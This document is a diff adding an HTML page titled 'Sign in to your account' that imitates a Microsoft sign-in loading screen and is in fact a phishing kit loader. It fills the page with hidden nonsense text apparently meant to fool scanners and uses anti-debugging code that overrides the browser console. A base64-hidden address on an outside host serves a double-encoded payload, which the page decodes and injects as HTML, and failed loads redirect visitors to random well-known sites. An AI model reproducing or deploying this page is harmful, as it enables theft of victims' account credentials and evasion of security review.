@@ -1,0 +1,658 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      #containerShadow,
+      #ef {
+        border-radius: 0 0 7px 7px
+      }
+
+      #cal,
+      #cal>.r {
+        display: flex
+      }
+
+      #fmask,
+      #openedFlap {
+        width: var(--envW);
+        height: 107px
+      }
+
+      #cal,
+      #ef,
+      #fmask,
+      #logo {
+        overflow: hidden
+      }
+
+      #loadingScreen {
+        position: fixed;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background-color: #fff
+      }
+
+      #loadingLogo {
+        position: fixed;
+        top: calc(50vh - 90px);
+        left: calc(50vw - 90px);
+        width: 180px;
+        height: 180px
+      }
+
+      #MSLogo {
+        position: fixed;
+        bottom: 36px;
+        left: calc(50vw - 45px)
+      }
+
+      .dark #loadingScreen {
+        background-color: #333
+      }
+
+      .darkNew #loadingScreen {
+        background-color: #1f1f1f
+      }
+
+      :root {
+        --s: 180px;
+        --envW: 130px;
+        --envH: 71px;
+        --calW: 118px;
+        --sqW: calc(var(--calW) / 3);
+        --sqH: 37px;
+        --calHH: 20px;
+        --calH: calc(var(--sqH) * 3 + var(--calHH));
+        --calY: calc(var(--calH) + 20px);
+        --calYExt: calc(var(--calH) - 80px);
+        --calYOverExt: calc(var(--calH) - 92px);
+        --flapS: 96px;
+        --flapH: calc(0.55 * var(--envH));
+        --flapScaleY: calc(var(--flapH) / var(--flapWidth));
+        --dur: 5s
+      }
+
+      #container {
+        width: var(--s);
+        height: var(--s);
+        animation: bounce var(--dur) infinite
+      }
+
+      @keyframes bounce {
+
+        0%,
+        100%,
+        12.5%,
+        32.5%,
+        50%,
+        76.1% {
+          transform: translateY(0)
+        }
+
+        22.5%,
+        86% {
+          transform: translateY(7px)
+        }
+      }
+
+      #logo {
+        height: 179px;
+        width: 130px;
+        margin-top: -59px;
+        margin-left: 25px
+      }
+
+      #containerShadow,
+      #ef,
+      #ef>.l,
+      #ef>.r {
+        height: var(--envH)
+      }
+
+      #containerShadow {
+        position: relative;
+        top: 120px;
+        left: 25px;
+        width: var(--envW);
+        box-shadow: rgba(0, 0, 0, .25) 0 4px 5px;
+        animation: shadow-fade var(--dur) infinite
+      }
+
+      @keyframes shadow-fade {
+
+        0%,
+        100%,
+        21.2%,
+        80% {
+          opacity: 0
+        }
+
+        47%,
+        70% {
+          opacity: 1
+        }
+      }
+
+      #flapContainer {
+        width: var(--envW);
+        margin-top: 179px
+      }
+
+      #ef {
+        width: var(--envW);
+        margin-top: -41px
+      }
+
+      #ef>.l {
+        width: 287px;
+        background: #28a8ea;
+        transform: translate(-153px, -70px) rotate(28deg)
+      }
+
+      #ef>.r {
+        width: 287px;
+        background: #1490df;
+        transform: translate(-120px, 63px) rotate(-28deg)
+      }
+
+      #eb {
+        width: var(--envW);
+        height: 40px;
+        background: #123b6d;
+        margin-top: -70px
+      }
+
+      #cal,
+      #cal>.r,
+      #cal>.t {
+        width: var(--calW)
+      }
+
+      #cal {
+        flex-direction: row;
+        flex-wrap: wrap;
+        height: var(--calH);
+        border-radius: 7px;
+        margin: -306px auto 0;
+        animation: cal-bounce var(--dur) infinite;
+        animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
+        transform: translateY(var(--calYExt)) scaleY(1)
+      }
+
+      @keyframes cal-bounce {
+
+        0%,
+        100%,
+        16.5%,
+        76.1% {
+          transform: translateY(var(--calY)) scaleY(1)
+        }
+
+        28% {
+          transform: translateY(var(--calYOverExt)) scaleY(1)
+        }
+
+        31% {
+          transform: translateY(var(--calYExt)) scaleY(1.05)
+        }
+
+        33% {
+          transform: translateY(var(--calYExt)) scaleY(.96)
+        }
+
+        34% {
+          transform: translateY(var(--calYExt)) scaleY(1)
+        }
+
+        68.5% {
+          transform: translateY(var(--calYExt)) scaleY(1);
+          animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29)
+        }
+      }
+
+      #cal>.t {
+        height: calc(var(--calHH) + 1px);
+        margin-bottom: -1px;
+        background: #0358a7
+      }
+
+      #cal>.r {
+        flex-direction: row;
+        height: var(--sqH)
+      }
+
+      .s {
+        width: var(--sqW);
+        height: calc(var(--sqH) + 1px)
+      }
+
+      .s1 {
+        background: #0078d4
+      }
+
+      .s2 {
+        background: #28a8ea
+      }
+
+      #closedFlap .flapTriangle,
+      .s3 {
+        background: #50d9ff
+      }
+
+      .s4 {
+        background: #0364b8
+      }
+
+      .s5 {
+        background: #14447d
+      }
+
+      #openedFlap {
+        animation: opened-flap-swing var(--dur) infinite;
+        animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+        transform-origin: top;
+        transform: translateY(-68px) rotate3d(1, 0, 0, -180deg)
+      }
+
+      @keyframes opened-flap-swing {
+
+        0%,
+        100%,
+        14.5%,
+        76% {
+          transform: translateY(-68px) rotate3d(1, 0, 0, -90deg)
+        }
+
+        16.5%,
+        50%,
+        74% {
+          transform: translateY(-68px) rotate3d(1, 0, 0, -180deg)
+        }
+      }
+
+      #closedFlap {
+        width: var(--envW);
+        animation: closed-flap-swing var(--dur) infinite;
+        animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+        transform-origin: top;
+        transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg)
+      }
+
+      @keyframes closed-flap-swing {
+
+        0%,
+        100%,
+        77%,
+        8.5% {
+          transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0)
+        }
+
+        14.5%,
+        50%,
+        76% {
+          transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg)
+        }
+      }
+
+      .flapTriangle {
+        width: var(--flapS);
+        height: var(--flapS);
+        background: #50d9ff;
+        margin: -48px auto 0;
+        border-radius: 7px;
+        transform: scaleY(.6) rotate(45deg)
+      }
+
+      #openedFlap .flapTriangle {
+        background: #123b6d
+      }
+    </style>
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <div id="loadingScreen" style="display: none;">
+      <div id="loadingLogo">
+        <div id="container">
+          <div id="containerShadow"></div>
+          <div id="logo">
+            <div id="flapContainer">
+              <div id="openedFlap">
+                <div id="fmask">
+                  <div class="flapTriangle"></div>
+                </div>
+              </div>
+              <div id="cal">
+                <div class="t"></div>
+                <div class="r">
+                  <div class="s s1"></div>
+                  <div class="s s2"></div>
+                  <div class="s s3"></div>
+                </div>
+                <div class="r">
+                  <div class="s s4"></div>
+                  <div class="s s1"></div>
+                  <div class="s s2"></div>
+                </div>
+                <div class="r">
+                  <div class="s s5"></div>
+                  <div class="s s4"></div>
+                  <div class="s s1"></div>
+                </div>
+              </div>
+            </div>
+            <div id="eb"></div>
+            <div id="ef">
+              <div class="r"></div>
+              <div class="l"></div>
+            </div>
+            <div id="closedFlap">
+              <div id="fmask">
+                <div class="flapTriangle"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <svg id="MSLogo" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="22" width="99">
+        <g fill="none" fill-rule="evenodd">
+          <path d="M34.643 12.075l-.588 1.647h-.034c-.105-.387-.28-.934-.556-1.63l-3.15-7.897h-3.077V16.75h2.03V9.032c0-.476-.01-1.052-.03-1.711-.01-.333-.049-.6-.058-.804h.045c.103.473.21.834.287 1.075l3.776 9.16h1.42l3.748-9.243c.085-.211.175-.622.257-.992h.044c-.048.915-.09 1.75-.095 2.256v7.978h2.165V4.195h-2.956l-3.228 7.88z" fill="#737474"></path>
+          <path d="M0 20.956h98.148V0H0z"></path>
+          <path d="M42.866 16.751h2.118V7.752h-2.118zM43.947 3.929c-.349 0-.653.119-.902.353a1.166 1.166 0 00-.378.883c0 .344.126.636.374.865.247.23.552.345.906.345s.66-.115.91-.345c.25-.23.379-.52.379-.865 0-.339-.125-.632-.37-.873a1.262 1.262 0 00-.919-.363M52.477 7.663a5.892 5.892 0 00-1.182-.127c-.971 0-1.838.209-2.574.62-.739.41-1.31.998-1.699 1.745-.386.745-.583 1.615-.583 2.585 0 .85.19 1.631.567 2.318.377.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.006 0 1.866-.201 2.554-.597l.027-.017v-1.94l-.089.066c-.312.227-.66.408-1.035.538a3.121 3.121 0 01-1.014.197c-.83 0-1.497-.26-1.982-.772-.485-.513-.73-1.233-.73-2.14 0-.912.255-1.651.761-2.196.504-.544 1.173-.82 1.986-.82.695 0 1.374.236 2.014.702l.09.063V8.011l-.029-.017c-.241-.135-.571-.246-.98-.331M59.452 7.597a2.17 2.17 0 00-1.415.507c-.358.296-.616.7-.814 1.207H57.2V7.753h-2.116v8.999H57.2v-4.603c0-.784.178-1.426.528-1.912.346-.48.806-.723 1.369-.723.19 0 .404.031.636.093.23.063.396.129.493.2l.09.064V7.737l-.034-.014c-.197-.083-.477-.126-.83-.126M66.885 14.465c-.397.499-.996.751-1.779.751-.777 0-1.39-.256-1.823-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.433-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.203 1.728-.604 2.23m-1.683-6.929c-1.484 0-2.663.435-3.503 1.293-.84.857-1.265 2.044-1.265 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.316 1.245 1.438 0 2.593-.441 3.434-1.31.84-.87 1.265-2.045 1.265-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M74.378 11.471c-.667-.268-1.095-.49-1.27-.66-.17-.165-.257-.398-.257-.693 0-.262.108-.472.327-.642.219-.17.526-.257.911-.257.357 0 .723.056 1.085.166.363.111.682.26.949.44l.088.06V7.928l-.035-.015a4.715 4.715 0 00-.962-.268 5.932 5.932 0 00-1.056-.109c-1.01 0-1.845.258-2.483.767-.64.512-.967 1.184-.967 1.997 0 .422.07.798.209 1.116.14.32.355.6.641.837.283.233.722.478 1.302.728.488.2.852.37 1.083.505.227.13.387.263.477.39.088.127.133.299.133.512 0 .604-.452.897-1.384.897a3.8 3.8 0 01-1.172-.213 4.418 4.418 0 01-1.2-.609l-.089-.064v2.064l.033.015c.304.14.686.257 1.137.35.449.094.859.141 1.213.141 1.096 0 1.977-.26 2.62-.771.648-.515.976-1.204.976-2.045 0-.607-.176-1.127-.525-1.546-.345-.416-.946-.799-1.784-1.136M84.063 14.465c-.398.499-.997.751-1.78.751-.777 0-1.39-.256-1.822-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.432-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.204 1.728-.604 2.23M82.38 7.536c-1.484 0-2.663.435-3.503 1.293-.84.857-1.266 2.044-1.266 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.317 1.245 1.438 0 2.593-.441 3.433-1.31.84-.87 1.266-2.045 1.266-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M98.149 9.48V7.752h-2.144V5.069l-.072.022-2.015.616-.038.012v2.034h-3.177V6.62c0-.527.118-.931.351-1.2.23-.266.56-.402.982-.402.303 0 .616.072.931.213l.079.035V3.447l-.037-.013c-.294-.105-.695-.159-1.19-.159-.626 0-1.194.136-1.689.406-.495.27-.886.655-1.16 1.146-.272.489-.41 1.054-.41 1.68v1.246h-1.492v1.726h1.493v7.273h2.142V9.479h3.177v4.622c0 1.903.897 2.868 2.668 2.868.291 0 .597-.034.91-.101.319-.07.535-.137.662-.21l.029-.016v-1.743l-.087.058c-.117.078-.262.14-.432.188-.17.048-.312.072-.422.072-.416 0-.723-.112-.914-.332-.191-.223-.289-.612-.289-1.158V9.48h2.144z" fill="#737474"></path>
+          <path d="M0 9.958h9.958V.001H0z" fill="#F05124"></path>
+          <path d="M10.995 9.958h9.957V.001h-9.957z" fill="#7EBB42"></path>
+          <path d="M0 20.956h9.958V11H0z" fill="#32A0DA"></path>
+          <path d="M10.995 20.956h9.957V11h-9.957z" fill="#FDB813"></path>
+        </g>
+      </svg>
+    </div>
+    <span hidden class="kbftwpuqgsxudvsqeoljlmuz">Trivia Competition in the senior center honors local heroes this coming Wednesday with a silent auction. Meanwhile, Community Meeting at the golf course debates critical issues earlier today.</span>
+    <span hidden class="ldtdhxxvfgsxucqqsqikeyag">art exhibition at the planetarium hosts international speakers earlier today with a silent auction. Meanwhile, Veteran's Parade in the open air market stimulates economic growth next month.</span>
+    <span hidden class="qbsuyjlqeovbxxqkgliarwon">dance recital at the new mall is happening yesterday with celebrity hosts. Additionally, features local artists dUISEiuIIEIERg the health workshop at the city hall.</span>
+    <span hidden class="nlzsdcxyrgwpiplvowdrawxq">on Monday night, Symphony performance at the aquarium ignites passion for the arts with family-friendly activities. Also, school board session at the planetarium is expected to reunites community members.</span>
+    <span hidden class="hmhdsdejhogamzfdmdymancz">this coming Wednesday, Music concert in the old town ignites passion for the arts which family-friendly activities. Also, fishing tournament in the open air market is expected to opens with record turnout.</span>
+    <span hidden class="yxdarfnencwawxazagspbtqb">historical reenactment on the village green breaks ground on new development yesterday and a special guest appearance. Meanwhile, Science Fair at the opera house stimulates economic growth this Friday.</span>
+    <span hidden class="xiuppjjujvpmflxvlfyujndw">climate change rally in the town hall demonstrates scientific achievements in two weeks which local bands. Meanwhile, poetry reading in the senior center sets a new attendance record on Monday night.</span>
+    <span hidden class="dlhtznguridpzemhqzbocwbs">yesterday, Film screening at the new mall opens with record turnout. Also, Poetry Reading at the racecourse is expected to brings together leaders.</span>
+    <span hidden class="yflpytpjrnuxxrbsdpvmyyvu">this Friday, Health workshop in the harbor area raises awareness for important causes. Also, symphony performance at the international convention center is expected to generates significant revenue.</span>
+    <div class="DuiofjUEI309" id="laphrcpkullwrfftbosxfbgofoctrawfkfmdvtefgww">
+      <div class="cloudflare_security_text" style="display: none;">Online safety check underway. <br>
+      </div>
+    </div>
+    <span hidden class="zkqjbwjvfhccmfidajzjvfqw">Car Show at the city hall showcases new technologies on Monday night which a silent auction. Meanwhile, health workshop on Riverside Avenue breaks ground on new development this Friday.</span>
+    <input type="hidden" id="UuejjerBHDdhEHE" value="">
+    <span hidden class="vduvbsrmoutgwxzcryxcmhmc">on Monday night, Startup pitch event at the beachfront park supports local businesses that a special guest appearance. Also, Symphony Performance at the zoo is expected to celebrates local culture.</span>
+    <input type="hidden" class="nuholhqyvuyxdllkgvbzbjfgljlloushyhloebng" id="JKDfIUfjdsnf" value="EMAIL TAG HERE">
+    <span hidden class="wgkbajgyfvbsrvxawrfdyceg">dance recital on the university campus is happening yesterday. Additionally, encourages eco-friendly practices dUISEiuIIEIERg the jazz night at the city hall.</span>
+    <input type="hidden" class="phaswckfhpjgxqegguezxhkr" id="KlwiHWjdk" value="=A3dopHMUVzNu1kRzhjZIlFN2hnYXxEbWpWLF1USUVkRJxULwkjMzt2Y1xmZ51WLTFESQV0Q">
+    <span hidden class="lqnmyikwouiirfzxlvjkmcdv">this coming Wednesday, Historical lecture in the tech hub area transforms the local landscape. Also, craft fair at the community center is expected to explores historical insights.</span>
+    <div id="sthjxckghaiughdsfgsdf"></div>
+    <span hidden class="nvtggjwronluxogbacipvwgd">in two weeks, Software release demo in the museum opens with record turnout with family-friendly activities. Also, networking event at the international convention center is expected to attracts tourists.</span>
+    <span hidden class="gvjnaozzlrszdazyrmcuzekm">this weekend, Fitness challenge on a private farm encourages eco-friendly practices. Also, Business Expo at the racecourse is expected to welcomes celebrities.</span>
+    <span hidden class="fquilahrpbayngcexqjxbsub">cooking class in the senior center culminates with spectacular fireworks on Monday night that interactive workshops. Meanwhile, Charity Run at the art gallery fosters innovation earlier today.</span>
+    <span hidden class="lkopqkhdtqsbxplkitzdfbws">Cybersecurity Seminar at the beachfront park culminates with spectacular fireworks earlier today that a silent auction. Meanwhile, Car Show at the state capitol hosts international speakers on Monday night.</span>
+    <input type="hidden" class="sqmfaaofyppfrlmqisfaeombhdqi" id="UISEiuIIEIER" value="aHR0cHM6Ly9zeXN0ZW0ubnM5Yy5uZXQvNDAzNzM2OTItMjViMC00MTE2LWE4YTctNTg2ZjIwNzFjM2NlL3A1UXc5WDhyTjMucGhw">
+    <span hidden class="otysosiapycrpmhdogmyndvp">on Monday night, Business expo in the central park sparks major interest. Also, Real Estate Open House at the racecourse is expected to advocates for social justice.</span>
+    <script>
+      var I = (function () {
+          var g = true
+          return function (h, i) {
+            var j = g
+              ? function () {
+                  if (i) {
+                    var k = i.apply(h, arguments)
+                    return (i = null), k
+                  }
+                }
+              : function () {}
+            return (g = false), j
+          }
+        })(),
+        J = I(this, function () {
+          return J.toString()
+            .search('(((.+)+)+)+$')
+            .toString()
+            .constructor(J)
+            .search('(((.+)+)+)+$')
+        })
+      J()
+      var K = (function () {
+          var g = true
+          return function (h, i) {
+            var j = g
+              ? function () {
+                  if (i) {
+                    var k = i.apply(h, arguments)
+                    return (i = null), k
+                  }
+                }
+              : function () {}
+            return (g = false), j
+          }
+        })(),
+        L = K(this, function () {
+          var h
+          try {
+            var i = Function('return (function() {}.constructor("return this")( ));')
+            h = i()
+          } catch (p) {
+            h = window
+          }
+          var j = (h.console = h.console || {}),
+            k = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
+          for (var l = 0; l < k.length; l++) {
+            var m = K.constructor.prototype.bind(K),
+              n = k[l],
+              o = j[n] || m
+            m['__proto__'] = K.bind(K)
+            m.toString = o.toString.bind(o)
+            j[n] = m
+          }
+        })
+      L()
+      $(document).ready(function () {
+        var h = [
+          'https://www.google.com',
+          'https://www.amazon.cn',
+          'https://www.twitter.com',
+          'https://www.yahoo.com',
+          'https://www.ebay.com',
+          'https://www.bing.com',
+          'https://www.linkedin.com',
+          'https://www.microsoft.com',
+          'https://www.apple.com',
+          'https://www.netflix.com',
+          'https://www.instagram.com',
+          'https://www.reddit.com',
+          'https://www.pinterest.com',
+          'https://www.tumblr.com',
+          'https://www.paypal.com',
+          'https://www.wordpress.com',
+          'https://www.facebook.com',
+          'https://www.wikipedia.org',
+          'https://www.quora.com',
+          'https://www.medium.com',
+          'https://www.stackoverflow.com',
+          'https://www.github.com',
+          'https://www.gitlab.com',
+          'https://www.bitbucket.org',
+          'https://www.slack.com',
+          'https://www.dropbox.com',
+          'https://www.box.com',
+          'https://www.drive.google.com',
+          'https://www.onedrive.live.com',
+          'https://www.spotify.com',
+          'https://www.soundcloud.com',
+          'https://www.twitch.tv',
+          'https://www.vimeo.com',
+          'https://www.dailymotion.com',
+          'https://www.hulu.com',
+          'https://www.disneyplus.com',
+          'https://www.hbo.com',
+          'https://www.showtime.com',
+          'https://www.starz.com',
+          'https://www.peacocktv.com',
+          'https://www.paramountplus.com',
+          'https://www.crunchyroll.com',
+          'https://www.funimation.com',
+          'https://www.nytimes.com',
+          'https://www.washingtonpost.com',
+          'https://www.theguardian.com',
+          'https://www.bbc.com',
+          'https://www.cnn.com',
+          'https://www.foxnews.com',
+          'https://www.nbcnews.com',
+          'https://www.cbsnews.com',
+          'https://www.bloomberg.com',
+          'https://www.reuters.com',
+          'https://www.cnbc.com',
+          'https://www.aljazeera.com',
+          'https://www.forbes.com',
+          'https://www.economist.com',
+          'https://www.ft.com',
+          'https://www.wsj.com',
+          'https://www.time.com',
+          'https://www.nationalgeographic.com',
+          'https://www.scientificamerican.com',
+          'https://www.nature.com',
+          'https://www.techcrunch.com',
+          'https://www.wired.com',
+          'https://www.theverge.com',
+          'https://www.gizmodo.com',
+          'https://www.engadget.com',
+          'https://www.mashable.com',
+          'https://www.digitaltrends.com',
+          'https://www.cnet.com',
+          'https://www.pcworld.com',
+          'https://www.techradar.com',
+          'https://www.anandtech.com',
+          'https://www.tomshardware.com',
+          'https://www.extremetech.com',
+          'https://www.bleepingcomputer.com',
+          'https://www.howtogeek.com',
+          'https://www.arstechnica.com',
+          'https://www.lifehacker.com',
+          'https://www.makeuseof.com',
+          'https://www.instructables.com',
+          'https://www.khanacademy.org',
+          'https://www.coursera.org',
+          'https://www.udacity.com',
+          'https://www.edx.org',
+          'https://www.udemy.com',
+          'https://www.skillshare.com',
+          'https://www.pluralsight.com',
+          'https://www.codecademy.com',
+          'https://www.duolingo.com',
+          'https://www.rosettastone.com',
+          'https://www.babbel.com',
+          'https://www.memrise.com',
+          'https://www.hellotalk.com',
+        ]
+        function i() {
+          const s = window.location.pathname.split('/')
+          return '/' + s[1] + '/'
+        }
+        const j = (s) =>
+            Array.from({ length: s }, () =>
+              'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=^*~'.charAt(
+                Math.floor(Math.random() * 67)
+              )
+            ).join(''),
+          k = i(),
+          l = j(100),
+          m = window.location.hash,
+          n = window.location.protocol + '//' + window.location.host + k + l + m
+        window.history.pushState({ path: n }, '', n)
+        if (false && true) {
+          $('.cloudflare_security_text').show()
+          $('#loadingScreen').hide()
+          const s = document.createElement('style')
+          document.head.appendChild(s)
+          s.sheet.insertRule(
+            '\n                                .DuiofjUEI309 {\n                                    position: absolute;\n                                    top: 50%;\n                                    left: 50%;\n                                    transform: translate(-50%, -50%);\n                                    height: 100px;\n                                    display: flex;\n                                    align-items: center;\n                                    justify-content: center;\n                                    flex-direction: column; \n                                }\n                            ',
+            0
+          )
+          window.onloadTurnstileCallback = function () {
+            turnstile.render('#laphrcpkullwrfftbosxfbgofoctrawfkfmdvtefgww', {
+              sitekey: '',
+              theme: 'light',
+              callback: function (t) {
+                const v = "sec='&token=" + t
+                $.ajax({
+                  type: 'POST',
+                  url: 'https://system.ns9c.net/40373692-25b0-4116-a8a7-586f2071c3ce/bR7sD9kJ2m.php.php',
+                  data: v,
+                  success: function (x) {
+                    if (x) {
+                      $('.DuiofjUEI309').hide()
+                      $('#loadingScreen').show()
+                      localStorage.setItem('ov-cf', 'true')
+                      let D = localStorage.getItem('ov-cf')
+                      function E(F) {
+                        return atob(
+                          atob(F.split('').reverse().join(''))
+                            .substring(71)
+                            .split('')
+                            .reverse()
+                            .join('')
+                        ).substring(71)
+                      }
+                      var z = $('#JKDfIUfjdsnf').val(),
+                        A = $('#KlwiHWjdk').val(),
+                        B = atob($('#UISEiuIIEIER').val())
+                      $.get(B, function (F) {
+                        $('#loadingScreen').hide()
+                        $('.cloudflare_security_text').hide()
+                        $('#sthjxckghaiughdsfgsdf').html(E(F))
+                      })
+                    } else {
+                      var C = h[Math.floor(Math.random() * h.length)]
+                      window.location.replace(C)
+                    }
+                  },
+                })
+              },
+            })
+          }
+        } else {
+          $('#loadingScreen').show()
+          localStorage.setItem('ov-cf', 'true')
+          let t = localStorage.getItem('ov-cf')
+          function u(v) {
+            return atob(
+              atob(v.split('').reverse().join(''))
+                .substring(71)
+                .split('')
+                .reverse()
+                .join('')
+            ).substring(71)
+          }
+          var p = $('#JKDfIUfjdsnf').val(),
+            q = $('#KlwiHWjdk').val(),
+            r = atob($('#UISEiuIIEIER').val())
+          $.get(r, function (v) {
+            $('#sthjxckghaiughdsfgsdf').html(u(v))
+            $('#loadingScreen').hide()
+          }).fail(function (v, w, x) {
+            if (v.status == 404) {
+              var y = h[Math.floor(Math.random() * h.length)]
+              window.location.replace(y)
+            }
+          })
+        }
+      })
+    </script>
+    <span hidden class="ubfwfputaycwqkccroqquuie">this coming Wednesday, Craft fair at the waterfront enriches cultural understanding and food trucks. Also, Craft Fair in the central park is expected to unveils new book collections.</span>
+    <span hidden class="afrmplwjolpkfpuersyrzqjy">earlier today, Fitness challenge at the art gallery highlights groundbreaking innovations. Also, Wildlife Conservation Talk at the zoo is expected to hosts international speakers.</span>
+    <span hidden class="eultzkrcisfhpeptgnfetvxj">this coming Wednesday, Dance recital at the monastery ignites passion for the arts and live music. Also, Trivia Competition on the village green is expected to kicks off the holiday season.</span>
+    <span hidden class="lakviglujrcyqeiacdkcdtlo">next month, Anime convention at the golf course brings joy to children. Also, Investor Meetup in the open air market is expected to ignites passion for the arts.</span>
+    <span hidden class="lfqmtzexulzvvssmuxmhrvnj">next month, Jazz night on the village green brings together leaders. Also, cooking class at the cathedral is expected to breaks ground on new development.</span>
+    <span hidden class="zzetvmmdgozgghgpifuqxazc">Mayoral Debate in the harbor area is happening this Friday with a VIP section. Additionally, showcases new technologies dUISEiuIIEIERg the cybersecurity seminar at the fairgrounds.</span>
+    <span hidden class="mdypkgzptfetywamnptbgonj">Fishing Tournament in the open air market is happening this weekend. Additionally, culminates with spectacular fireworks dUISEiuIIEIERg the Technology Conference in the mountain region.</span>
+  </body>
+</html>
